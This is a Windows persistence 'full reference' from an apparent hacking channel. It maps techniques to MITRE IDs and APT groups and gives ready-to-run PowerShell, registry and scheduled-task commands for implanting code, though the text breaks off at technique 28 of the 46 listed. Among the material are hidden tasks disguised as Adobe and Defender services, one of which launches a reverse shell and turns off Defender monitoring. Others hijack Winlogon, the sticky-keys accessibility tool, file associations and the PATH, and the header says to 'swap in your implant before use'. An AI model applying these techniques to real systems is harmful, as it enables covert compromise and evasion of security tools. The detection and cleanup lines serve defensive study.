# Windows Persistence Techniques — Full Reference
> **Author:** M. Manikandan
> **Location:** Kumbakonam, Tamil Nadu
> **Channel:** Hacker Tamizha
> All payload paths replaced with `{path}` — swap in your implant before use.
> For educational & lab use only.

---

## Quick Index

| # | Technique | Admin | MITRE TTP | ATT&CK ID |
|---|-----------|-------|-----------|-----------|
| 1 | Startup Folder — EXE Copy | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 2 | Startup Folder — LNK Shortcut | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 3 | All Users Startup | ✅ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 4 | Scheduled Task (schtasks basic) | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 5 | Scheduled Task XML — Single Action | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 6 | Scheduled Task XML — Multi Action | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 7 | At.exe Legacy Scheduler | ❌ | Scheduled Task/Job: At | T1053.002 |
| 8 | Registry Run Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 9 | Explorer Policy Run Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 10 | Explorer Load Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 11 | CMD AutoRun | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 12 | Environment Variable | ❌ | Modify Registry | T1112 |
| 13 | Logon Script (UserInitMprLogonScript) | ❌ | Boot or Logon Init Scripts: Logon Script (Win) | T1037.001 |
| 14 | Logon BAT Script | ❌ | Boot or Logon Init Scripts: Logon Script (Win) | T1037.001 |
| 15 | StartupApproved Bypass | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 16 | IFEO Debugger Hijack | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 17 | SilentProcessExit | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 18 | Userinit Hijack | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 19 | Shell Hijack (Winlogon) | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 20 | Winlogon MPNotify | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 21 | Active Setup | ✅ | Boot or Logon Autostart: Active Setup | T1547.014 |
| 22 | Boot Execute | ✅ | Pre-OS Boot: Bootkit (Session Manager) | T1542.003 |
| 23 | Terminal Server Initial Program (RDP) | ✅ | Remote Services: Remote Desktop Protocol | T1021.001 |
| 24 | Accessibility Hijack (sethc / utilman) | ✅ | Event Triggered: Accessibility Features | T1546.008 |
| 25 | Screensaver (SCRNSAVE.EXE) | ❌ | Event Triggered: Screensaver | T1546.002 |
| 26 | Screensaver Path Hijack | ❌ | Event Triggered: Screensaver | T1546.002 |
| 27 | Shell Open Command Hijack (.txt) | ❌ | Event Triggered: Change Default File Association | T1546.001 |
| 28 | PATH Hijack | ❌ | Hijack Execution Flow: Path Interception | T1574.007 |
| 29 | Shortcut Hijack | ❌ | Boot or Logon Autostart: Shortcut Modification | T1547.009 |
| 30 | Recycle Bin Persistence | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 31 | PowerShell Profile | ❌ | Event Triggered: PowerShell Profile | T1546.013 |
| 32 | New Service | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 33 | Modify Existing Service | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 34 | Service Failure Recovery | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 35 | BITS Job Persistence | ❌ | BITS Jobs | T1197 |
| 36 | Disk Cleanup COM Handler | ❌ | Event Triggered: Component Object Model Hijacking | T1546.015 |
| 37 | Windows Error Reporting (AeDebug) | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 38 | Application Shim (AppCompat) | ✅ | Event Triggered: Application Shimming | T1546.011 |
| 39 | WMI Event Subscription | ✅ | Event Triggered: Windows Management Instrumentation | T1546.003 |
| 40 | Hidden User Account | ✅ | Create Account: Local Account | T1136.001 |
| 41 | fodhelper UAC Bypass | ❌ | Abuse Elevation Control: Bypass UAC | T1548.002 |
| 42 | WSL Persistence | ❌ | Command & Scripting Interpreter: Unix Shell | T1059.004 |
| 43 | DPAPI CurrentUser Registry | ❌ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 44 | DPAPI Machine Scope | ✅ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 45 | AES Encrypted Registry Loader | ❌ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 46 | XOR Obfuscated + DPAPI + RunKey | ❌ | Obfuscated Files + Registry Run Keys | T1027 + T1547.001 |

---

## Known APT Groups by Technique

| Technique / TTP | Known APT Groups |
|-----------------|-----------------|
| Startup Folder (T1547.001) | APT29 (Cozy Bear), APT32 (OceanLotus), Lazarus Group, FIN7 |
| Registry Run Keys (T1547.001) | APT28 (Fancy Bear), Turla, Kimsuky, Carbanak |
| Scheduled Task (T1053.005) | APT41, Lazarus Group, FIN6, Cobalt Group |
| Logon Script (T1037.001) | APT3, APT29 |
| IFEO Debugger Hijack (T1546.012) | Turla, APT3 |
| Winlogon Helper DLL (T1547.004) | APT28, Turla, PLATINUM |
| Active Setup (T1547.014) | APT29 |
| Accessibility Hijack (T1546.008) | APT3, APT28, CyberArk |
| Screensaver (T1546.002) | APT28, OilRig |
| Shell Open Command Hijack (T1546.001) | Patchwork, Turla |
| Path Interception (T1574.007) | APT41, PowerGhost |
| PowerShell Profile (T1546.013) | APT29, Turla |
| Windows Service (T1543.003) | APT28, Lazarus Group, FIN7, Carbanak |
| BITS Jobs (T1197) | APT41, APT28, FIN7, BRONZE BUTLER |
| COM Hijacking (T1546.015) | APT28, Turla, BRONZE BUTLER |
| Application Shimming (T1546.011) | CarbonSpider, FIN7 |
| WMI Event Subscription (T1546.003) | APT29, APT33, Lazarus Group, Turla |
| Create Account (T1136.001) | APT33, OilRig, Lazarus Group |
| UAC Bypass (T1548.002) | APT29, APT41, Turla |
| Obfuscation (T1027) | APT28, APT29, Lazarus Group, APT41 |

---

## 1. Startup Folder — EXE Copy
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT29, APT32, Lazarus Group, FIN7

Windows Startup = Auto-run list when PC turns ON. Any program placed there launches automatically — no manual open needed. Like a "to-do list" your PC follows every morning.

```powershell
# Copy implant to current user Startup
copy {path} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

# Verify
dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\" | Select Name, LastWriteTime

# List via WMI (Autoruns equivalent)
Get-CimInstance Win32_StartupCommand | Select Name, Command, Location, User

# WMIC (legacy)
wmic startup get caption,command

# Cleanup
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{filename}"
```

**Registry path:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
**Quick access:** `Win+R` → `shell:startup`

---

## 2. Startup Folder — LNK Shortcut
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT29, Lazarus Group

Drops a `.lnk` (shortcut) instead of the EXE — harder to detect, icon blend-in.

```powershell
$WS = New-Object -ComObject WScript.Shell
$SC = $WS.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upd.lnk")
$SC.TargetPath = "{path}"
$SC.Save()

# Verify
dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"

# Cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upd.lnk"
```

---

## 3. All Users Startup
**TTP:** T1547.001 | **Admin:** ✅ | **APT:** APT29, FIN7

Affects every user on the machine — fires for any login.

```powershell
# All Users path
copy "{path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

# Quick access: Win+R → shell:common startup

# Verify
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

---

## 4. Scheduled Task (schtasks — Basic)
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group, FIN6

Scheduled Task = PC's alarm clock for programs. Set "run this at this time / event" — PC does it automatically. Harder to spot than Startup folder.

```powershell
# Create daily task
schtasks /create /tn "DemoTasks\OpenCalc" /sc daily /st 10:00 /tr "{path}"

# Enumerate all tasks
schtasks /query /fo LIST /V

# Specific task
schtasks /query /tn "DemoTasks\OpenCalc" /fo LIST /v

# CSV export
schtasks /query /fo CSV /v > tasks.csv

# Filter running tasks
schtasks /query /fo TABLE | findstr "Running"

# Filter SYSTEM tasks
schtasks /query /fo LIST /v | findstr /i "system"

# Cleanup
schtasks /delete /tn "DemoTasks\OpenCalc" /f
```

```powershell
# PowerShell enumeration
Get-ScheduledTask
Get-ScheduledTask | Select TaskName, TaskPath, State
Get-ScheduledTask -TaskName "WindowsUpdate" | Get-ScheduledTaskInfo
Get-ScheduledTask | Select TaskName, @{N="Execute";E={$_.Actions.Execute}}
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
Get-ScheduledTask | ConvertTo-Json -Depth 5 > tasks.json
Get-ScheduledTask -TaskPath "\Microsoft\Windows\"

# Non-Microsoft tasks only (threat hunting)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName, TaskPath, State

# Registry location
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
```

---

## 5. Scheduled Task XML — Single Action
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group

XML-based task masquerading as a legitimate Adobe service with logon + boot triggers.

```powershell
# Step 1: Create XML
@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Adobe Flash Sync Service</Description>
    <URI>\AdobeFlashSync</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:COMPUTERNAME\$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{path}</Command>
    </Exec>
  </Actions>
</Task>
"@ | Out-File "task.xml" -Encoding Unicode

# Step 2: Register
schtasks /create /tn "AdobeFlashSync" /xml "task.xml" /f

# Step 3: Verify
schtasks /query /tn "AdobeFlashSync" /fo LIST /v
schtasks /query /tn "AdobeFlashSync" /xml

# Step 4: Manual trigger test
schtasks /run /tn "AdobeFlashSync"

# Step 5: Cleanup
schtasks /delete /tn "AdobeFlashSync" /f
```

**XML task files location:** `C:\Windows\System32\Tasks\`

```powershell
# Enumerate task XMLs
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse
Get-Content "C:\Windows\System32\Tasks\DemoTasks\OpenCalc"

# Non-Microsoft only
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse | Where-Object { $_.FullName -notlike "*Microsoft*" }

# Full content of non-MS tasks
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse -File |
Where-Object { $_.FullName -notlike "*Microsoft*" } |
ForEach-Object {
    Write-Host "=== $($_.Name) ===" -ForegroundColor Green
    Get-Content $_.FullName
}
```

---

## 6. Scheduled Task XML — Multi Action
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Cobalt Group

Multi-action task: runs implant, launches PowerShell reverse shell, copies to Startup, adds Run key, disables Defender — all in one trigger.

```powershell
@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Defender Sync Service</Description>
    <URI>\WindowsDefenderSync</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2026-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:COMPUTERNAME\$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <!-- Action 1: Run implant -->
    <Exec><Command>{path}</Command></Exec>

    <!-- Action 2: PowerShell reverse shell -->
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\to\shell.ps1</Arguments>
    </Exec>

    <!-- Action 3: Copy to Startup -->
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c copy {path} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost32.exe"</Arguments>
    </Exec>

    <!-- Action 4: Add Run key -->
    <Exec>
      <Command>reg.exe</Command>
      <Arguments>add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinDefSync" /t REG_SZ /d "{path}" /f</Arguments>
    </Exec>

    <!-- Action 5: Disable Windows Defender -->
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"</Arguments>
    </Exec>
  </Actions>
</Task>
"@ | Out-File "multitask.xml" -Encoding Unicode

# Register
schtasks /create /tn "WindowsDefenderSync" /xml "multitask.xml" /f

# Verify
schtasks /query /tn "WindowsDefenderSync" /fo LIST /v
schtasks /query /tn "WindowsDefenderSync" /xml

# Manual trigger
schtasks /run /tn "WindowsDefenderSync"

# Cleanup
schtasks /delete /tn "WindowsDefenderSync" /f
```

---

## 7. At.exe Legacy Scheduler
**TTP:** T1053.002 | **Admin:** ❌ | **APT:** APT28, older threat actors

Legacy Windows task scheduler — deprecated but still present on older systems.

```powershell
# Schedule at specific time
at 10:00 /every:M,T,W,Th,F "{path}"

# List
at

# Delete all
at /delete /yes
```

---

## 8. Registry Run Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT28, Turla, Kimsuky, Carbanak

Classic persistence — runs EXE on every user login. No admin needed for HKCU.

```powershell
# Add Run key
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f

# Verify
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate

# Also check RunOnce
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# Machine-wide (admin required)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f

# Cleanup
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f
```

---

## 9. Explorer Policy Run Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT28, Turla

Alternative Run key path — often missed by basic AV scans.

```powershell
# Add under Explorer policies (less monitored)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f

# Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v MSUpdate /f
```

---

## 10. Explorer Load Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Turla, BRONZE BUTLER

Loads DLL/EXE via the `Load` value under Windows — runs at Explorer startup.

```powershell
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "{path}" /f

# Verify
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /f
```

---

## 11. CMD AutoRun
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Turla, FIN7

Runs EXE every time `cmd.exe` opens — persists across any CMD session.

```powershell
# Add AutoRun
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "{path}" /f

# Verify
reg query "HKCU\Software\Microsoft\Command Processor" /v AutoRun

# Cleanup
reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f
```

---

## 12. Environment Variable
**TTP:** T1112 | **Admin:** ❌ | **APT:** OilRig, APT28

Modifies user environment — can be abused to redirect program execution.

```powershell
reg add "HKEY_CURRENT_USER\Environment" /v DemoApp /t REG_SZ /d "{path}" /f

# Cleanup
REG DELETE "HKEY_CURRENT_USER\Environment" /v DemoApp /f
```

---

## 13. Logon Script (UserInitMprLogonScript)
**TTP:** T1037.001 | **Admin:** ❌ | **APT:** APT3, APT29, Lazarus Group

Runs at logon via the `UserInitMprLogonScript` environment variable — no admin needed.

```powershell
# Add logon script
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "{path}" /f

# Verify
reg query "HKCU\Environment" /v UserInitMprLogonScript

# Cleanup
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
```

---

## 14. Logon BAT Script
**TTP:** T1037.001 | **Admin:** ❌ | **APT:** APT3, Kimsuky

Routes through a `.bat` file for additional obfuscation layer.

```powershell
# Step 1: Create BAT
echo {path} > C:\ProgramData\logon.bat

# Step 2: Set logon script
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\ProgramData\logon.bat" /f

# Step 3: Verify
type C:\ProgramData\logon.bat
reg query "HKCU\Environment" /v UserInitMprLogonScript

# Step 4: Cleanup
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
del C:\ProgramData\logon.bat
```

---

## 15. StartupApproved Bypass
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** FIN7

Windows 10+ tracks enabled/disabled startup items in `StartupApproved`. Bypassing this allows hidden startup items.

```powershell
# Add to Startup folder
copy "{path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Set StartupApproved to "enabled" (02 = enabled, 03 = disabled)
$val = [byte[]](0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" `
    -Name "update.exe" -Value $val -Type Binary

# Verify
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder"

# Cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "update.exe"
```

---

## 16. IFEO Debugger Hijack
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Turla, APT3, PLATINUM

Image File Execution Options — runs implant instead of (or before) the target process. Fires on launch of the hijacked EXE.

```powershell
# Runs implant every time notepad.exe launches
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "{path}" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f
```

---

## 17. SilentProcessExit
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Turla, APT3

Fires implant when a monitored process **exits** (not launches) — different trigger from standard IFEO.

```powershell
# When notepad.exe exits → implant fires
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "{path}" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f

# Enable global flag on target process
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f

# Trigger: open and close notepad → payload fires

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f
```

---

## 18. Userinit Hijack
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla, PLATINUM

Appends implant to `Userinit` — fires at every user login alongside `userinit.exe`.

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,{path}" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit

# Restore default
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
```

---

## 19. Shell Hijack (Winlogon)
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla

Replaces/appends to the `Shell` value — runs alongside `explorer.exe` at login.

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,{path}" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell

# Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
```

---

## 20. Winlogon MPNotify
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, PLATINUM

`mpnotify` runs after successful logon — less monitored than Userinit/Shell.

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /t REG_SZ /d "{path}" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /f
```

---

## 21. Active Setup
**TTP:** T1547.014 | **Admin:** ✅ | **APT:** APT29

Runs once per user on login — uses fake GUID component. Fires for each new user that logs in.

```powershell
# Create component
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v StubPath /t REG_SZ /d "{path}" /f
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v Version /t REG_SZ /d "1,0,0,0" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /f
```

---

## 22. Boot Execute
**TTP:** T1542.003 | **Admin:** ✅ | **APT:** Advanced nation-state actors

Runs before Windows fully loads — early-boot persistence. Extremely stealthy.

```powershell
# Add to BootExecute (multi-string)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0{path}" /f

# Restore default
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *" /f
```

---

## 23. Terminal Server Initial Program (RDP)
**TTP:** T1021.001 | **Admin:** ✅ | **APT:** APT33, OilRig, Lazarus Group

Fires implant on every RDP login — targets remote desktop sessions specifically.

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "{path}" /f

# Verify
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram

# Cleanup
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /f
```

---

## 24. Accessibility Hijack (sethc / utilman)
**TTP:** T1546.008 | **Admin:** ✅ | **APT:** APT3, APT28, CyberArk

Hijacks Sticky Keys (`Shift×5`) or Ease of Access (`Win+U`) on the lock screen — fires at login screen **before** authentication.

```powershell
# sethc.exe = Sticky Keys (Shift x5)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "{path}" /f

# utilman.exe = Win+U on lock screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "{path}" /f

# Verify
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

---

## 25. Screensaver (SCRNSAVE.EXE)
**TTP:** T1546.002 | **Admin:** ❌ | **APT:** APT28, OilRig

Points screensaver to implant — fires after idle timeout (10 seconds in this config).

```powershell
# Set screensaver to implant
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "{path}" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f

# Verify
reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE
reg query "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut
reg query "HKCU\Control Panel\Desktop" /v ScreenSaveActive

# Restore
reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "900" /f
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f
```

---

## 26. Screensaver Path Hijack
**TTP:** T1546.002 | **Admin:** ❌ | **APT:** APT28, OilRig

Drops implant renamed as `.scr` to user-writable path, then points registry to it.

```powershell
# Drop implant as .scr
copy "{path}" "%APPDATA%\scrnsave.scr"

# Point registry
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%APPDATA%\scrnsave.scr" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "10" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f

# Verify
reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE

# Cleanup
reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
del "%APPDATA%\scrnsave.scr"
```

---

## 27. Shell Open Command Hijack (.txt)
**TTP:** T1546.001 | **Admin:** ❌ | **APT:** Patchwork, Turla

Overrides the file association handler for `.txt` — implant runs every time a text file is opened.

```powershell
reg add "HKCU\Software\Classes\txtfile\shell\open\command" /ve /t REG_SZ /d "{path} %1" /f

# Verify
reg query "HKCU\Software\Classes\txtfile\shell\open\command"

# Cleanup
reg delete "HKCU\Software\Classes\txtfile" /f
```

---

## 28. PATH Hijack
**TTP:** T1574.007 | **Admin:** ❌ | **APT:** APT41, PowerGhost

Drops implant with a common tool name in a user-writable PATH location. Windows searches PATH left-to-right — implant fires first.

```powershell
# Check user-writable PATH locations
$env:PATH -split ";"

# Common writable: C:\Users\<user>\AppData\Local\Microsoft\WindowsApps
copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe"
copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\git.exe"
copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\node.exe"

# Every call to python/git/node → implant runs first
# No registry write, no startup folder, no task

# Verify
where.exe python

# Cleanup
del "$env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe"
